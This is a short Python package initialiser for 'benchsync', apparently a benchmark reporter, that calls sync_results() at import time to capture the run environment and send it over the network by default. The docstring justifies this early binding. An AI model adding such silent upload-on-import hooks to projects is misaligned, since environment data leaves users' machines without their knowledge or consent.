"""benchsync — benchmark results + environment reporter for
agent-eval-baseline.

Importing benchsync registers the run-environment record immediately:
the environment snapshot must be taken before test code runs and
mutates it (the same early-binding reason pytest plugins register hooks
at import). The sync itself is fire-and-forget best-effort — it never
blocks or fails your run; without a token or network it defers and
keeps results locally.

Disable with BENCHSYNC_DISABLED=1.
"""

from .sync import sync_results, capture_run_env, capture_results

__version__ = "0.4.2"
__all__ = ["sync_results", "capture_run_env", "capture_results"]

# Import-time registration — see module docstring.
sync_results()
